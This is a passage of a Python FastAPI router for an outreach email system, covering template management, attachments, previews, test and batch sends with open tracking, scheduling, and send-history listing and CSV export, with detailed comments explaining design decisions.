"""Email template management, preview, and compose/send endpoints.

Powers the Outreach > Email Campaigns experience: managing reusable email
templates (one marked default), previewing merged output for a contact, and
composing/sending outreach emails to selected contacts.
"""

import csv
import io
import logging
import uuid
from datetime import date, datetime, time as dt_time, timedelta, timezone
from typing import Optional, Union
from urllib.parse import quote

from fastapi import APIRouter, Depends, File, HTTPException, Query, UploadFile
from fastapi.responses import Response, StreamingResponse
from sqlalchemy import select, update, func
from sqlalchemy.ext.asyncio import AsyncSession

from app.csv_export import csv_safe
from app.database import get_db
from app.dependencies import get_current_user_optional
from app.models.company import Company
from app.models.contact import Contact
from app.models.email_template import (
    DELIVERED_STATUSES,
    EmailSend,
    EmailTemplate,
    EmailTemplateAttachment,
    WIRE_STATUSES,
)
from app.models.interaction import Interaction
from app.models.user import User
from app.org_context import scope_write_to_current_org
from app.schemas.email_template import (
    ABStats,
    ABStatsResponse,
    CampaignAnalytics,
    EmailComposeRequest,
    EmailComposeResponse,
    EmailComposeResult,
    EmailSendPaginatedResponse,
    EmailSendRead,
    EmailTemplateAttachmentRead,
    EmailTemplateCreate,
    EmailTemplateRead,
    EmailTemplateUpdate,
    TemplatePerformance,
    TemplatePreviewRequest,
    TemplatePreviewResponse,
    TemplateValidateRequest,
    TemplateValidateResponse,
    SendTestRequest,
    SendTestResponse,
    AIEmailGenerateRequest,
    AIEmailGenerateResponse,
)
from app.services import template_attachments, template_validation
from app.services.email_compose import SAMPLE_CONTEXT, build_merge_context, render
from app.services.ai_email_generator import generate_email as ai_generate_email
from app.services.email_dispatch import get_account, resolve_sender_info, send_outreach_email
from app.routers.tracking import generate_tracking_pixel_url
from app.services.uploads import read_capped

logger = logging.getLogger(__name__)
router = APIRouter(tags=["email"])

# ``EmailSend.status`` values that mean the message never left. ``bounced`` is
# here too: a bounce is a delivery failure, and counting it in the denominator of
# an open rate reports a copy problem for what is a list problem.
FAILURE_STATUSES = ("error", "failed", "bounced")


# --- Helpers ---

async def _get_template_or_404(db: AsyncSession, template_id: uuid.UUID) -> EmailTemplate:
    result = await db.execute(select(EmailTemplate).where(EmailTemplate.id == template_id))
    template = result.scalar_one_or_none()
    if not template:
        raise HTTPException(status_code=404, detail="Email template not found")
    return template


async def _get_default_template(db: AsyncSession) -> Optional[EmailTemplate]:
    result = await db.execute(
        select(EmailTemplate).where(EmailTemplate.is_default == True)  # noqa: E712
    )
    return result.scalar_one_or_none()


def _reject_invalid(subject: Optional[str], body: Optional[str]) -> None:
    """400 if the template would not render correctly. Warnings do not block.

    Called on every write path, because the alternative is where these mistakes
    used to surface: a syntax error raises inside the dispatcher on a live
    enrollment days later, and an unknown merge field never surfaces at all — it
    renders as empty text and the mail goes out reading ``Hi ,``.
    """
    result = template_validation.validate_template(subject, body)
    if not result["valid"]:
        raise HTTPException(status_code=400, detail="; ".join(result["errors"]))


async def _clear_default(db: AsyncSession, except_id: Optional[uuid.UUID] = None) -> None:
    """Unset is_default on this org's templates (optionally except one).

    Scoped explicitly: a Core ``update()`` gets no ``org_id`` predicate from the
    global read filter, so "all templates where is_default" meant every tenant's.
    The default is what unattended send paths resolve when no template is named,
    so clearing another org's decided which copy their next mail went out as.
    """
    stmt = scope_write_to_current_org(
        update(EmailTemplate).where(EmailTemplate.is_default == True), EmailTemplate  # noqa: E712
    ).values(is_default=False)
    if except_id is not None:
        stmt = stmt.where(EmailTemplate.id != except_id)
    await db.execute(stmt)
    await db.flush()


# --- Template CRUD ---

@router.get("/email-templates", response_model=list[EmailTemplateRead])
async def list_email_templates(
    include_archived: bool = Query(
        False, description="Include retired templates. Off by default — the "
                           "common caller is a picker."
    ),
    db: AsyncSession = Depends(get_db),
):
    """List email templates (default first, then newest).

    Archived templates are excluded unless asked for. They still exist and still
    own their send history; they are simply not something to pick for a new send.
    """
    query = select(EmailTemplate)
    if not include_archived:
        query = query.where(EmailTemplate.is_archived == False)  # noqa: E712
    result = await db.execute(
        query.order_by(EmailTemplate.is_default.desc(), EmailTemplate.created_at.desc())
    )
    return list(result.scalars().all())


@router.post("/email-templates", response_model=EmailTemplateRead, status_code=201)
async def create_email_template(
    payload: EmailTemplateCreate,
    db: AsyncSession = Depends(get_db),
):
    """Create a new email template. If marked default, any prior default is cleared.

    If no template is currently marked default, the first one created becomes default.

    Rejects a template that would not render: a Jinja syntax error (which used to
    surface as a send failure on a live enrollment days later) or a merge field
    that is not in the render context (which used to surface as nothing at all —
    Jinja substitutes an empty string, so ``{{firstname}}`` ships ``Hi ,``).
    """
    _reject_invalid(payload.subject, payload.body)
    make_default = payload.is_default
    if not make_default and await _get_default_template(db) is None:
        make_default = True

    if make_default:
        await _clear_default(db)

    template = EmailTemplate(
        name=payload.name,
        subject=payload.subject,
        body=payload.body,
        is_default=make_default,
    )
    db.add(template)
    try:
        await db.flush()
    except Exception:
        await db.rollback()
        raise HTTPException(status_code=409, detail="A template with that name already exists")
    await db.refresh(template)
    logger.info("Created email template '%s' (default=%s)", template.name, template.is_default)
    return template


@router.put("/email-templates/{template_id}", response_model=EmailTemplateRead)
async def update_email_template(
    template_id: uuid.UUID,
    payload: EmailTemplateUpdate,
    db: AsyncSession = Depends(get_db),
):
    """Update an email template's fields.

    Content changes are validated against the final state of the template, not
    against the patch: editing only the subject still has to render alongside the
    body already stored, and a partial update is exactly where a merge field can
    lose the context that used to satisfy it.
    """
    template = await _get_template_or_404(db, template_id)
    update_data = payload.model_dump(exclude_unset=True)

    if "subject" in update_data or "body" in update_data:
        _reject_invalid(
            update_data.get("subject", template.subject),
            update_data.get("body", template.body),
        )

    # Handle default toggling carefully to preserve the single-default invariant.
    if update_data.get("is_default") is True:
        await _clear_default(db, except_id=template_id)
    elif update_data.get("is_default") is False and template.is_default:
        raise HTTPException(
            status_code=400,
            detail="Cannot unset the default directly — mark another template as default instead",
        )

    for field, value in update_data.items():
        setattr(template, field, value)

    try:
        await db.flush()
    except Exception:
        await db.rollback()
        raise HTTPException(status_code=409, detail="A template with that name already exists")
    await db.refresh(template)
    logger.info("Updated email template %s", template_id)
    return template


@router.delete("/email-templates/{template_id}", status_code=204)
async def delete_email_template(
    template_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """Delete an email template that has never been used.

    A template with sends is refused, because ``email_sends.template_id`` is
    ``ON DELETE SET NULL``: removing the row silently detaches every send it
    produced, and the answer to "which copy earned those replies" goes with it.
    That is backwards — the templates worth retiring are the used ones, which
    are the only ones whose history is worth anything. Archive those instead.

    Delete stays available for a template that never sent, where there is no
    history to protect and a typo'd draft should not be immortal.
    """
    template = await _get_template_or_404(db, template_id)
    if template.is_default:
        raise HTTPException(
            status_code=400,
            detail="Cannot delete the default template — set another template as default first",
        )

    sends = (
        await db.execute(
            select(func.count(EmailSend.id)).where(EmailSend.template_id == template_id)
        )
    ).scalar() or 0
    if sends:
        raise HTTPException(
            status_code=409,
            detail=(
                f"Template has {sends} send(s) — deleting it would detach them and "
                f"lose the attribution. Archive it instead "
                f"(POST /email-templates/{template_id}/archive)."
            ),
        )

    await db.delete(template)
    await db.flush()
    logger.info("Deleted email template %s (no sends)", template_id)


@router.post("/email-templates/{template_id}/archive", response_model=EmailTemplateRead)
async def archive_email_template(
    template_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """Retire a template without touching what it sent.

    It leaves the pickers and keeps its send history, so
    ``/email-templates/{id}/performance`` still answers for it — which is the
    whole point, since the reason to retire a template is usually that you have
    just finished measuring it.

    Refuses the default template: archiving the one every un-templated send falls
    back to would leave that path resolving to a template nobody can see.
    """
    template = await _get_template_or_404(db, template_id)
    if template.is_default:
        raise HTTPException(
            status_code=400,
            detail="Cannot archive the default template — set another template as default first",
        )
    if not template.is_archived:
        template.is_archived = True
        template.archived_at = datetime.now(timezone.utc)
        await db.flush()
        logger.info("Archived email template %s", template_id)
    await db.refresh(template)
    return template


@router.post("/email-templates/{template_id}/unarchive", response_model=EmailTemplateRead)
async def unarchive_email_template(
    template_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """Bring an archived template back into the pickers."""
    template = await _get_template_or_404(db, template_id)
    template.is_archived = False
    template.archived_at = None
    await db.flush()
    await db.refresh(template)
    logger.info("Unarchived email template %s", template_id)
    return template


# --- Attachments ---

async def _get_attachment_or_404(
    db: AsyncSession, template_id: uuid.UUID, attachment_id: uuid.UUID
) -> EmailTemplateAttachment:
    """One attachment, pinned to the template named in the URL.

    The template is looked up first through the org-scoped read, so a foreign
    template id is a 404 before the attachment id is ever consulted.
    """
    await _get_template_or_404(db, template_id)
    result = await db.execute(
        select(EmailTemplateAttachment).where(
            EmailTemplateAttachment.id == attachment_id,
            EmailTemplateAttachment.template_id == template_id,
        )
    )
    attachment = result.scalars().first()
    if attachment is None:
        raise HTTPException(status_code=404, detail="Attachment not found")
    return attachment


@router.post(
    "/email-templates/{template_id}/attachments",
    response_model=EmailTemplateAttachmentRead,
    status_code=201,
)
async def upload_template_attachment(
    template_id: uuid.UUID,
    file: UploadFile = File(..., description="File sent with every email from this template"),
    db: AsyncSession = Depends(get_db),
):
    """Attach a file to a template. It goes out with every email rendered from it.

    Limits are enforced here rather than at send time — see
    ``app.services.template_attachments`` — because at send time a file that is
    too large or a blocked type fails every recipient in the batch.
    """
    template = await _get_template_or_404(db, template_id)
    filename = template_attachments.sanitize_filename(file.filename)
    data = await read_capped(
        file, template_attachments.MAX_FILE_BYTES, what="Attachment"
    )
    template_attachments.check_new_attachment(
        filename, len(data), [a.size_bytes for a in template.attachments]
    )

    attachment = EmailTemplateAttachment(
        template_id=template.id,
        filename=filename,
        content_type=template_attachments.resolve_content_type(file.content_type, filename),
        size_bytes=len(data),
        content=data,
    )
    db.add(attachment)
    await db.flush()
    await db.refresh(attachment, attribute_names=["created_at"])
    logger.info(
        "Attached %s (%d bytes) to email template %s",
        attachment.filename, attachment.size_bytes, template_id,
    )
    return attachment


@router.get("/email-templates/{template_id}/attachments/{attachment_id}")
async def download_template_attachment(
    template_id: uuid.UUID,
    attachment_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """The attachment's bytes, as a download — never rendered inline.

    ``attachment`` disposition and ``nosniff`` because the content type is
    whatever the uploader's browser declared: an HTML file served inline from
    this origin would run with the viewer's session.
    """
    attachment = await _get_attachment_or_404(db, template_id, attachment_id)
    data = (
        await db.execute(
            select(EmailTemplateAttachment.content).where(
                EmailTemplateAttachment.id == attachment.id
            )
        )
    ).scalar_one()
    return Response(
        content=data,
        media_type=attachment.content_type,
        headers={
            "Content-Disposition": _content_disposition(attachment.filename),
            "X-Content-Type-Options": "nosniff",
        },
    )


@router.delete(
    "/email-templates/{template_id}/attachments/{attachment_id}", status_code=204
)
async def delete_template_attachment(
    template_id: uuid.UUID,
    attachment_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """Remove an attachment. Emails already sent keep the copy they carried."""
    attachment = await _get_attachment_or_404(db, template_id, attachment_id)
    await db.delete(attachment)
    await db.flush()
    logger.info("Removed attachment %s from email template %s", attachment_id, template_id)


def _content_disposition(filename: str) -> str:
    """``attachment`` with an ASCII fallback name and the RFC 5987 UTF-8 one."""
    fallback = filename.encode("ascii", "replace").decode("ascii").replace('"', "")
    return f"attachment; filename=\"{fallback}\"; filename*=UTF-8''{quote(filename)}"


@router.post(
    "/email-templates/{template_id}/clone",
    response_model=EmailTemplateRead,
    status_code=201,
)
async def clone_email_template(
    template_id: uuid.UUID,
    name: Optional[str] = Query(
        None, description="Name for the copy. Defaults to '<name> (copy)'."
    ),
    db: AsyncSession = Depends(get_db),
):
    """Copy a template so a variant can be written without editing the original.

    The alternative people actually do is edit the live template in place, which
    silently changes what every future send says *and* makes the existing send
    history describe copy that no longer exists — the sends stay attributed to a
    template whose text has moved underneath them.

    The copy is never the default and never archived, whatever the source was: a
    clone is a draft, and inheriting default status would silently repoint every
    un-templated send at untested copy.
    """
    source = await _get_template_or_404(db, template_id)
    new_name = (name or f"{source.name} (copy)").strip()[:255]

    clone = EmailTemplate(
        name=new_name,
        subject=source.subject,
        body=source.body,
        is_default=False,
        is_archived=False,
    )
    # A variant of a template is a variant of the email it sends, and the files
    # are part of that email.
    for item in await template_attachments.load_for_send(db, source.id):
        clone.attachments.append(EmailTemplateAttachment(
            filename=item.filename,
            content_type=item.content_type,
            size_bytes=len(item.data),
            content=item.data,
        ))
    db.add(clone)
    try:
        await db.flush()
    except Exception:
        await db.rollback()
        raise HTTPException(
            status_code=409, detail=f"A template named '{new_name}' already exists"
        )
    await db.refresh(clone)
    logger.info("Cloned email template %s into %s", template_id, clone.id)
    return clone


@router.get(
    "/email-templates/{template_id}/performance", response_model=TemplatePerformance
)
async def email_template_performance(
    template_id: uuid.UUID,
    days: Optional[int] = Query(
        None, ge=1, le=365, description="Only count sends from the last N days."
    ),
    db: AsyncSession = Depends(get_db),
):
    """What this template actually achieved.

    Templates could be created, previewed, sent and A/B-tested, and nothing
    reported how any single one performed — the closest thing was an org-wide
    roll-up over every send. So the question the template library exists to
    answer, "which of these should we keep using", had no answer.

    ``failed`` is reported next to the engagement counts on purpose. Rates here
    are over sends *attempted*, and a template whose sends are erroring looks
    identical to one being ignored if you only read the open rate — failed sends
    never open. A high ``failure_rate`` means the numbers below it are describing
    a smaller campaign than the send count suggests.

    Scope is ``email_sends``: the manual and template send paths. Sequence-step
    copy is a different send path with a different table and reports through
    ``/dialtone/sequences/{id}/analytics``.
    """
    template = await _get_template_or_404(db, template_id)

    conditions = [EmailSend.template_id == template_id]
    if days:
        conditions.append(
            EmailSend.sent_at >= datetime.now(timezone.utc) - timedelta(days=days)
        )

    row = (
        await db.execute(
            select(
                func.count(EmailSend.id),
                func.count(EmailSend.opened_at),
                func.count(EmailSend.clicked_at),
                func.count(EmailSend.replied_at),
                func.min(EmailSend.sent_at),
                func.max(EmailSend.sent_at),
            ).where(*conditions)
        )
    ).one()
    sent, opened, clicked, replied, first_at, last_at = row

    failed = (
        await db.execute(
            select(func.count(EmailSend.id)).where(
                *conditions, EmailSend.status.in_(FAILURE_STATUSES)
            )
        )
    ).scalar() or 0
    delivered = max(0, sent - failed)

    def _rate(numerator: int, denominator: int) -> float:
        return round(numerator / denominator, 4) if denominator else 0.0

    return TemplatePerformance(
        template_id=template.id,
        name=template.name,
        is_default=template.is_default,
        is_archived=template.is_archived,
        sent=sent,
        delivered=delivered,
        failed=failed,
        opened=opened,
        clicked=clicked,
        replied=replied,
        # Engagement is measured against mail that actually left, not against
        # attempts — dividing opens by a send count padded with failures reports
        # a copy problem for what is a delivery problem.
        open_rate=_rate(opened, delivered),
        click_rate=_rate(clicked, delivered),
        reply_rate=_rate(replied, delivered),
        failure_rate=_rate(failed, sent),
        first_send_at=first_at,
        last_send_at=last_at,
    )


@router.post("/email-templates/validate", response_model=TemplateValidateResponse)
async def validate_email_template(
    payload: TemplateValidateRequest,
    db: AsyncSession = Depends(get_db),
):
    """Check a template without saving it, and get the warnings too.

    Create and update reject on **errors** only, so the warnings — a merge field
    inside a URL, copy with no personalization at all, a missing unsubscribe line
    — are otherwise invisible until someone reads the mail that went out. This is
    the endpoint an editor calls while the author is still typing.

    Accepts inline ``subject``/``body``, or a ``template_id`` to check what is
    already stored (each field falls back to the stored one, so an author can
    check an edit to the subject against the live body).
    """
    subject, body = payload.subject, payload.body
    if payload.template_id is not None:
        template = await _get_template_or_404(db, payload.template_id)
        subject = subject if subject is not None else template.subject
        body = body if body is not None else template.body

    return TemplateValidateResponse(**template_validation.validate_template(subject, body))


@router.post("/email-templates/{template_id}/set-default", response_model=EmailTemplateRead)
async def set_default_template(
    template_id: uuid.UUID,
    db: AsyncSession = Depends(get_db),
):
    """Mark a template as the default, clearing the flag on any other template."""
    template = await _get_template_or_404(db, template_id)
    await _clear_default(db, except_id=template_id)
    template.is_default = True
    await db.flush()
    await db.refresh(template)
    logger.info("Set email template %s as default", template_id)
    return template


# --- Preview ---

@router.post("/email-templates/preview", response_model=TemplatePreviewResponse)
async def preview_email_template(
    payload: TemplatePreviewRequest,
    db: AsyncSession = Depends(get_db),
):
    """Render a template's subject and body with a contact's data merged in.

    Resolution order for the template content: inline subject/body if given,
    else the referenced template_id, else the default template. The merge
    context comes from the given contact_id, or sample data if none is provided.
    """
    subject_tmpl = payload.subject
    body_tmpl = payload.body

    if subject_tmpl is None or body_tmpl is None:
        template = None
        if payload.template_id is not None:
            template = await _get_template_or_404(db, payload.template_id)
        else:
            template = await _get_default_template(db)
        if template is None:
            raise HTTPException(status_code=404, detail="No template available to preview")
        subject_tmpl = subject_tmpl if subject_tmpl is not None else template.subject
        body_tmpl = body_tmpl if body_tmpl is not None else template.body

    if payload.contact_id is not None:
        result = await db.execute(select(Contact).where(Contact.id == payload.contact_id))
        contact = result.scalar_one_or_none()
        if not contact:
            raise HTTPException(status_code=404, detail="Contact not found")
        company_result = await db.execute(
            select(Company).where(Company.id == contact.company_id)
        )
        company = company_result.scalar_one_or_none()
        context = build_merge_context(contact, company)
    else:
        context = dict(SAMPLE_CONTEXT)

    return TemplatePreviewResponse(
        subject=render(subject_tmpl, context),
        body=render(body_tmpl, context),
        merge_context=context,
    )


# --- Compose / Send ---


# --- Send Test ---

@router.post("/email-templates/send-test", response_model=SendTestResponse)
async def send_test_email(
    payload: SendTestRequest,
    db: AsyncSession = Depends(get_db),
):
    """Send a single test email using a template with placeholder merge data.

    Renders the template with sample values, prefixes the subject with
    ``[TEST]``, and sends to the provided ``test_email`` address. Useful for
    verifying template content and deliverability before sending to real
    contacts.
    """
    template = await _get_template_or_404(db, payload.template_id)

    # Build sample merge context for test rendering.
    context = {
        "first_name": "Test",
        "last_name": "User",
        "full_name": "Test User",
        "company": "Sample Company",
        "company_name": "Sample Company",
        "industry_segment": "Technology",
        "industry": "Technology",
        "city": "New York",
        "contact_title": "VP of Marketing",
        "title": "VP of Marketing",
        "email": payload.test_email,
        "demo_link": "https://best-molding-demo.pages.dev",
    }

    subject = "[TEST] " + render(template.subject, context)
    body_html = render(template.body, context)
    # The test is of the email as recipients will get it, files included —
    # a deck that is too large for the recipient's server should fail here.
    attachments = await template_attachments.load_for_send(db, template.id)

    try:
        send_result = await send_outreach_email(
            db,
            to_email=payload.test_email,
            subject=subject,
            body_html=body_html,
            sender_account_id=payload.sender_account_id,
            attachments=attachments,
        )
        status = send_result.get("status", "error")
        detail = send_result.get("reason") or send_result.get("detail")

        if status == "sent":
            logger.info(
                "Test email sent to %s using template %s",
                payload.test_email, payload.template_id,
            )
            return SendTestResponse(status="sent", subject=subject, detail=detail)

        # ``skipped`` used to be reported here as ``sent``, on the same theory
        # as the dashboard's status set: it meant SES wasn't configured, so the
        # compose "worked". It is what the dispatcher returns for every soft
        # decline — the spam gate, the warm-up ramp, the daily cap, and the
        # suppression list — so the operator asking "did that reach the inbox?"
        # was told yes for mail that was never sent, and told it most often for
        # the reasons they most needed to know about. The reason rides along in
        # ``detail``; report what happened.
        logger.warning(
            "Test email to %s using template %s not sent (%s): %s",
            payload.test_email, payload.template_id, status, detail,
        )
        return SendTestResponse(status="failed", subject=subject, detail=detail)
    except Exception as exc:
        logger.exception("Test email error for %s", payload.test_email)
        return SendTestResponse(
            status="failed", subject=subject, detail=str(exc),
        )

@router.post("/email-compose", response_model=EmailComposeResponse)
async def compose_and_send(
    payload: EmailComposeRequest,
    db: AsyncSession = Depends(get_db),
    current_user: Optional[User] = Depends(get_current_user_optional),
):
    """Compose and send an outreach email to the selected contacts.

    Uses the specified template, or the default template if none is given.
    Records each send in ``email_sends`` (and logs an interaction) for tracking.
    When authenticated, each send is attributed to the current user so the
    per-client communication history shows who sent what.
    """
    # Attribute sends to the acting user, falling back to the sender Gmail
    # account's owner (for automated/API-key batches sent from a user's inbox).
    sender_user_id = current_user.id if current_user is not None else None
    if payload.template_id is not None:
        template = await _get_template_or_404(db, payload.template_id)
    else:
        template = await _get_default_template(db)
        if template is None:
            raise HTTPException(status_code=400, detail="No default template configured")

    # Validate template subject and body are not empty before sending.
    if not template.subject or not template.subject.strip():
        raise HTTPException(status_code=400, detail="Template subject cannot be empty")
    if not template.body or not template.body.strip():
        raise HTTPException(status_code=400, detail="Template body cannot be empty")

    # Resolve who this batch is sent as (selected/active Gmail account, else SES).
    sender_info = await resolve_sender_info(db, payload.sender_account_id)

    # If we don't have an authenticated user, attribute the send to the owner
    # of the sending account (so history still shows who the mailbox belongs to).
    if sender_user_id is None and sender_info.account_id is not None:
        acct = await get_account(db, sender_info.account_id)
        sender_user_id = getattr(acct, "user_id", None) if acct else None

    # Read once for the batch, not per contact: every recipient gets the same
    # files, and the bytes are the expensive part of the row.
    attachments = await template_attachments.load_for_send(db, template.id)

    results: list[EmailComposeResult] = []
    sent = skipped = errors = scheduled = 0

    for i, contact_id in enumerate(payload.contact_ids):
        result = await db.execute(select(Contact).where(Contact.id == contact_id))
        contact = result.scalar_one_or_none()
        if not contact:
            skipped += 1
            results.append(EmailComposeResult(
                contact_id=contact_id, status="skipped", detail="contact_not_found"
            ))
            continue

        if not contact.email:
            skipped += 1
            results.append(EmailComposeResult(
                contact_id=contact_id, status="skipped", detail="no_email_address"
            ))
            db.add(EmailSend(
                template_id=template.id, contact_id=contact.id,
                to_email=None, subject=template.subject, status="skipped",
                error="no_email_address",
            ))
            continue

        # Never email a contact who has unsubscribed or been suppressed
        # (CAN-SPAM / CASL; suppression is the Feature-1 hard opt-out flag).
        if contact.unsubscribed or getattr(contact, "suppressed", False):
            skipped += 1
            reason = "suppressed" if getattr(contact, "suppressed", False) else "unsubscribed"
            results.append(EmailComposeResult(
                contact_id=contact_id, to_email=contact.email,
                status="skipped", detail=reason,
            ))
            db.add(EmailSend(
                template_id=template.id, contact_id=contact.id,
                to_email=contact.email, subject=template.subject,
                status="skipped", error=reason,
            ))
            continue

        try:
            # A/B variant selection
            variant = "B" if payload.subject_b and i % 2 else "A" if payload.subject_b else None

            company_result = await db.execute(
                select(Company).where(Company.id == contact.company_id)
            )
            company = company_result.scalar_one_or_none()
            context = build_merge_context(contact, company)

            # Use variant B subject if applicable
            if variant == "B":
                subject = render(payload.subject_b, context)
            else:
                subject = render(template.subject, context)
            body_html = render(template.body, context)

            # Create an EmailSend record first so we have a send_id for tracking
            email_send = EmailSend(
                template_id=template.id,
                contact_id=contact.id,
                to_email=contact.email,
                subject=subject,
                status="pending",
                ab_variant=variant,
                user_id=sender_user_id,
            )
            db.add(email_send)
            await db.flush()

            # Inject open tracking pixel into email body (opt-out for cold
            # first-touch sends where a hidden pixel hurts deliverability)
            if payload.track_opens:
                tracking_pixel_url = generate_tracking_pixel_url(str(email_send.id))
                body_html = body_html + f'<img src="{tracking_pixel_url}" width="1" height="1" style="display:none" />'

            # Handle scheduled sends. The rendered copy has to be **persisted**
            # here: the merge context is built from the contact and company as
            # they are now, and nothing reconstructs it later. Before this,
            # ``scheduled`` rows carried a subject and no body at all, which is
            # part of why nothing could have sent them —
            # ``app.tasks.scheduled_sends`` is the sweep that does.
            if payload.scheduled_at:
                email_send.status = "scheduled"
                email_send.scheduled_at = payload.scheduled_at
                email_send.body_html = body_html
                # Pin the mailbox this batch was composed as. An immediate send
                # never needed it: ``payload.sender_account_id`` reaches the
                # dispatcher inside this same call. A scheduled row is resolved
                # again by the sweep days later, and leaving this NULL does not
                # mean "the default account" — ``resolve_sender_info`` runs
                # ``get_next_rotation_account``, so it means *whichever mailbox
                # is least recently used at send time*. The response above has
                # already told the operator which address this batch sends as.
                email_send.sender_account_id = sender_info.account_id
                scheduled += 1
                results.append(EmailComposeResult(
                    contact_id=contact_id, to_email=contact.email,
                    status="scheduled", detail="scheduled for later",
                ))
                continue

            send_result = await send_outreach_email(
                db,
                to_email=contact.email,
                subject=subject,
                body_html=body_html,
                sender_account_id=payload.sender_account_id,
                signature_id=payload.signature_id,
                attachments=attachments,
            )
            status = send_result.get("status", "error")
            message_id = send_result.get("message_id")
            detail = send_result.get("reason") or send_result.get("detail")

            # Update the existing EmailSend record with send result
            email_send.status = status
            email_send.provider_message_id = message_id
            email_send.error = None if status == "sent" else detail
            # Capture Gmail thread tracking fields
            if send_result.get("gmail_message_id"):
                email_send.gmail_message_id = send_result["gmail_message_id"]
            if send_result.get("gmail_thread_id"):
                email_send.gmail_thread_id = send_result["gmail_thread_id"]
            if send_result.get("from_email"):
                email_send.from_email = send_result["from_email"]
            if send_result.get("sender_account_id"):
                from uuid import UUID as _UUID
                email_send.sender_account_id = _UUID(send_result["sender_account_id"])
            # Store the rendered body for thread view
            email_send.body_html = body_html

            if status == "sent":
                # An ``Interaction`` is a claim, on the contact's own timeline,
                # that we emailed this person. ``skipped`` was included here on
                # the theory that it only meant "SES creds aren't configured —
                # still a successful compose"; it is also what a suppressed
                # recipient, a spam-gate block, a warm-up hold and a spent daily
                # cap record. So the contact whose whole point is that we did
                # *not* email them got a timeline entry saying we did — and a
                # rep reading that history has no way to tell it from a real
                # one.
                db.add(Interaction(
                    company_id=contact.company_id,
                    contact_id=contact.id,
                    interaction_type="email",
                    subject=subject,
                    notes=f"Outreach email composed via template '{template.name}'",
                ))

            if status == "sent":
                sent += 1
            elif status == "skipped":
                skipped += 1
            else:
                errors += 1

            results.append(EmailComposeResult(
                contact_id=contact_id, to_email=contact.email, status=status, detail=detail
            ))
        except Exception as exc:
            logger.exception("Error processing contact %s in compose batch", contact_id)
            errors += 1
            results.append(EmailComposeResult(
                contact_id=contact_id,
                to_email=getattr(contact, "email", None),
                status="error",
                detail=str(exc),
            ))

    await db.flush()
    logger.info(
        "Compose to %d contacts via '%s' as %s (%s): sent=%d scheduled=%d skipped=%d errors=%d",
        len(payload.contact_ids), template.name, sender_info.from_email,
        sender_info.transport, sent, scheduled, skipped, errors,
    )
    return EmailComposeResponse(
        template_id=template.id,
        sent=sent,
        scheduled=scheduled,
        skipped=skipped,
        errors=errors,
        transport=sender_info.transport,
        sender=sender_info.from_email,
        results=results,
    )


def _apply_email_send_filters(
    query,
    contact_id: Optional[uuid.UUID] = None,
    status: Optional[str] = None,
    date_from: Optional[date] = None,
    date_to: Optional[date] = None,
):
    """Apply common filters to an EmailSend query.

    The two date bounds are built **UTC-aware and half-open**, and both halves of
    that matter.

    *Aware*: ``sent_at`` is ``TIMESTAMP(timezone=True)``. A naive bound compared
    against it is not rejected — Postgres coerces it using the session's
    ``TimeZone``, which nothing in this application sets, so the window silently
    slides by whatever ``initdb`` picked off the host. These were the last two
    naive bounds in ``app/``; every other ``datetime.combine`` in the codebase
    passes ``tzinfo`` explicitly. Nothing fails when this is wrong: the export
    and the send-history list return a window shifted by a whole number of hours,
    and a send near either midnight silently moves in or out of a report.

    *Half-open*: ``datetime.max.time()`` is 23:59:59.999999, so an inclusive
    upper bound drops the last microsecond of ``date_to``. ``< date_to + 1 day``
    has no edge to get wrong and does not depend on the column's precision.
    """
    if contact_id is not None:
        query = query.where(EmailSend.contact_id == contact_id)
    if status is not None:
        query = query.where(EmailSend.status == status)
    if date_from is not None:
        query = query.where(
            EmailSend.sent_at
            >= datetime.combine(date_from, dt_time.min, tzinfo=timezone.utc)
        )
    if date_to is not None:
        query = query.where(
            EmailSend.sent_at
            < datetime.combine(date_to, dt_time.min, tzinfo=timezone.utc)
            + timedelta(days=1)
        )
    return query


@router.get(
    "/email-sends",
    response_model=Union[EmailSendPaginatedResponse, list[EmailSendRead]],
)
async def list_email_sends(
    contact_id: Optional[uuid.UUID] = Query(None),
    status: Optional[str] = Query(None, description="Filter by status (sent, skipped, error, scheduled, bounced)"),
    date_from: Optional[date] = Query(None, description="Filter sends on or after this date (YYYY-MM-DD)"),
    date_to: Optional[date] = Query(None, description="Filter sends on or before this date (YYYY-MM-DD)"),
    page: Optional[int] = Query(None, ge=1, description="Page number (enables pagination when provided)"),
    per_page: int = Query(50, ge=1, le=200, description="Items per page (used with page param)"),
    limit: int = Query(500, ge=1, le=2000, description="Max results when not using pagination"),
    db: AsyncSession = Depends(get_db),
):
    """List email send history (most recent first) for the tracking view.

    Supports two modes:
    - **List mode** (default): returns a flat list, controlled by ``limit``.
      Backward-compatible with existing frontend hooks.
    - **Paginated mode**: when ``page`` is provided, returns
      ``{items, total, page, per_page, pages}``.

    Both modes accept optional ``contact_id``, ``status``, ``date_from``,
    and ``date_to`` filters.
    """
    base = select(EmailSend).order_by(EmailSend.sent_at.desc())
    base = _apply_email_send_filters(base, contact_id, status, date_from, date_to)

    if page is not None:
        # Paginated mode
        count_q = select(func.count()).select_from(
            _apply_email_send_filters(
                select(EmailSend.id), contact_id, status, date_from, date_to
            ).subquery()
        )
        total = (await db.execute(count_q)).scalar() or 0
        pages = max(1, -(-total // per_page))  # ceil division

        query = base.offset((page - 1) * per_page).limit(per_page)
        result = await db.execute(query)
        items = list(result.scalars().all())

        return EmailSendPaginatedResponse(
            items=items,
            total=total,
            page=page,
            per_page=per_page,
            pages=pages,
        )

    # Legacy list mode
    query = base.limit(limit)
    result = await db.execute(query)
    return list(result.scalars().all())


@router.get("/email-sends/export-csv")
async def export_email_sends_csv(
    contact_id: Optional[uuid.UUID] = Query(None),
    status: Optional[str] = Query(None),
    date_from: Optional[date] = Query(None),
    date_to: Optional[date] = Query(None),
    db: AsyncSession = Depends(get_db),
):
    """Export email send history as a CSV file.

    Accepts the same filters as the list endpoint. Returns all matching
    rows (no pagination limit).
    """
    query = select(EmailSend).order_by(EmailSend.sent_at.desc())
    query = _apply_email_send_filters(query, contact_id, status, date_from, date_to)

    result = await db.execute(query)
    sends = list(result.scalars().all())

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow([
        "id", "template_id", "contact_id", "to_email", "subject",
        "status", "sent_at", "opened_at", "clicked_at", "ab_variant",
        "scheduled_at", "error",
    ])
    # ``csv_safe`` on every free-text column. The three that matter are not ones
